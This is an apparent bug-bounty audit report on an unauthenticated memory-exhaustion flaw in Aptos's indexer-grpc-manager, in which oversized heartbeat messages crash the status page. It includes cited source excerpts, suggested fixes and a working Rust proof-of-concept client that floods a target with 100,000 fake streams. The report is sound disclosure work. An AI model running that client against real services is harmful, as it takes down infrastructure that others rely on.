# Audit Report

## Title
Unauthenticated Memory Exhaustion Attack via Malicious Heartbeat Messages in Indexer-GRPC Manager Status Page

## Summary
The indexer-grpc-manager's status page rendering is vulnerable to memory exhaustion attacks. An unauthenticated attacker can send malicious heartbeat messages containing an excessive number of fake ActiveStream objects, which are rendered without pagination or size limits. When the status page is accessed, the `to_html_string()` call attempts to serialize a massive HTML tree into memory, leading to OOM crashes and service unavailability. [1](#0-0) 

## Finding Description

The vulnerability exists in the interaction between three components:

1. **Unauthenticated Heartbeat Endpoint**: The GrpcManager service accepts heartbeat messages without authentication or authorization. [2](#0-1) 

2. **Unbounded Data Storage**: The MetadataManager stores heartbeat data with no validation on the number of active_streams within each StreamInfo. While it limits storage to 100 states per service, each state can contain an unlimited number of ActiveStream objects (bounded only by the 256MB gRPC message size limit). [3](#0-2) 

3. **Unbounded Rendering**: The status page renders ALL active streams from ALL stored states without pagination, size limits, or resource constraints. [4](#0-3) 

**Attack Path:**

1. Attacker connects to the GrpcManager's gRPC endpoint (no authentication required)
2. Crafts a HeartbeatRequest with LiveDataServiceInfo or HistoricalDataServiceInfo
3. Includes a StreamInfo with hundreds of thousands of fake ActiveStream entries (fitting within the 256MB message limit)
4. The metadata manager stores this malicious data
5. When any user accesses the status page endpoint, the rendering code iterates over all fake streams
6. For each stream, it creates multiple HtmlElement objects with TableRow and TableCell components
7. The HTML tree grows to gigabytes in memory during construction
8. The `to_html_string()` call attempts to serialize this massive tree, allocating excessive memory
9. The service runs out of memory and crashes (OOM)

The vulnerability breaks the "Resource Limits" invariant - the status page rendering has no computational or memory bounds. [5](#0-4) 

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria ("API crashes" - up to $50,000):

- **Service Unavailability**: The indexer-grpc-manager crashes and becomes unavailable, requiring manual restart
- **Client Impact**: All clients depending on the indexer service lose access to indexed blockchain data
- **Cascading Effects**: The crash affects the entire status page infrastructure and potentially impacts data service coordination

While this doesn't affect blockchain consensus or validator operations directly, the indexer-grpc-manager is critical infrastructure for the Aptos ecosystem, providing indexed data access to applications, explorers, and analytics services.

## Likelihood Explanation

**Likelihood: HIGH**

- **No Authentication Required**: The heartbeat endpoint accepts connections from any client without credentials
- **Easy to Exploit**: Requires only crafting a gRPC message with inflated data - no sophisticated attack techniques needed
- **Low Attacker Requirements**: Any network-accessible client can perform the attack
- **Repeatable**: Attacker can send multiple malicious heartbeats to compound the effect
- **Persistent**: Malicious data remains stored (up to 100 states) until service restart or cleanup

The attack can be executed with a simple gRPC client script and causes immediate, observable impact.

## Recommendation

Implement multiple defensive layers:

1. **Input Validation**: Limit the number of active_streams accepted in heartbeat messages
```rust
const MAX_ACTIVE_STREAMS_PER_HEARTBEAT: usize = 1000;

fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate stream count
    if let Some(stream_info) = &info.stream_info {
        if stream_info.active_streams.len() > MAX_ACTIVE_STREAMS_PER_HEARTBEAT {
            bail!("Too many active streams in heartbeat: {}", 
                  stream_info.active_streams.len());
        }
    }
    // ... rest of existing logic
}
```

2. **Status Page Pagination**: Implement pagination or truncation in the status page rendering to limit the number of streams displayed per page.

3. **Authentication**: Add authentication/authorization to the heartbeat endpoint to only accept heartbeats from trusted data services.

4. **Resource Limits**: Add memory usage monitoring and abort rendering if it exceeds reasonable thresholds.

## Proof of Concept

```rust
// PoC: Malicious gRPC client sending oversized heartbeat

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    ActiveStream, HeartbeatRequest, LiveDataServiceInfo,
    ServiceInfo, StreamInfo, StreamProgress,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target GrpcManager
    let channel = Channel::from_static("http://target-grpc-manager:50051")
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);

    // Create malicious heartbeat with 100,000 fake streams
    let mut fake_streams = Vec::new();
    for i in 0..100_000 {
        fake_streams.push(ActiveStream {
            id: format!("fake-stream-{}", i),
            start_version: i * 1000,
            end_version: Some((i + 1) * 1000),
            start_time: None,
            progress: Some(StreamProgress { samples: vec![] }),
        });
    }

    let malicious_info = LiveDataServiceInfo {
        chain_id: 1,
        timestamp: None,
        known_latest_version: Some(1000000),
        stream_info: Some(StreamInfo {
            active_streams: fake_streams,
        }),
        min_servable_version: Some(0),
    };

    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("malicious-service:8080".to_string()),
            info: Some(Info::LiveDataServiceInfo(malicious_info)),
        }),
    };

    // Send malicious heartbeat (no auth required)
    let response = client.heartbeat(request).await?;
    println!("Heartbeat accepted: {:?}", response);

    // Now when someone accesses http://target-grpc-manager:status_page
    // The service will OOM trying to render 100,000+ streams

    Ok(())
}
```

To verify the vulnerability:
1. Run the PoC against a test indexer-grpc-manager instance
2. Access the status page endpoint
3. Observe memory consumption spike and eventual OOM crash
4. Check service logs for out-of-memory errors

**Notes**

This vulnerability is specific to the indexer-grpc infrastructure and does not directly impact blockchain consensus, validator operations, or on-chain state. However, it represents a critical availability issue for the Aptos indexer ecosystem. The lack of input validation combined with unbounded rendering creates a straightforward denial-of-service vector that can be exploited by any unauthenticated network client.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/status_page/mod.rs (L74-80)
```rust
    let page = HtmlPage::new()
        .with_title("Status")
        .with_style(STYLE)
        .with_script_literal(SCRIPT)
        .with_raw(nav_bar)
        .with_raw(content)
        .to_html_string();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L280-349)
```rust
fn render_stream_table(streams: Vec<(String, Timestamp, StreamInfo)>) -> Table {
    streams.into_iter().fold(
        Table::new()
            .with_attributes([("style", "width: 100%; border: 5px solid black;")])
            .with_thead_attributes([("style", "background-color: lightcoral; color: white;")])
            .with_custom_header_row(
                TableRow::new()
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("Stream Id"))
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("Timestamp"))
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("Current Version"))
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("End Version"))
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Data Service Instance"),
                    )
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 10s throughput"),
                    )
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 60s throughput"),
                    )
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 10min throughput"),
                    ),
            ),
        |mut table, stream| {
            let data_service_instance = stream.0;
            let timestamp = format!("{:?}", stream.1);
            stream.2.active_streams.iter().for_each(|active_stream| {
                table.add_custom_body_row(
                    TableRow::new()
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(&active_stream.id))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(&timestamp))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(format!(
                            "{:?}",
                            active_stream.progress.as_ref().and_then(|progress| {
                                progress.samples.last().map(|sample| sample.version)
                            })
                        )))
                        .with_cell(
                            TableCell::new(TableCellType::Data)
                                .with_raw(active_stream.end_version()),
                        )
                        .with_cell(
                            TableCell::new(TableCellType::Data)
                                .with_raw(data_service_instance.as_str()),
                        )
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(
                            get_throughput_from_samples(
                                active_stream.progress.as_ref(),
                                Duration::from_secs(10),
                            ),
                        ))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(
                            get_throughput_from_samples(
                                active_stream.progress.as_ref(),
                                Duration::from_secs(60),
                            ),
                        ))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(
                            get_throughput_from_samples(
                                active_stream.progress.as_ref(),
                                Duration::from_secs(600),
                            ),
                        )),
                )
            });
            table
        },
    )
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```
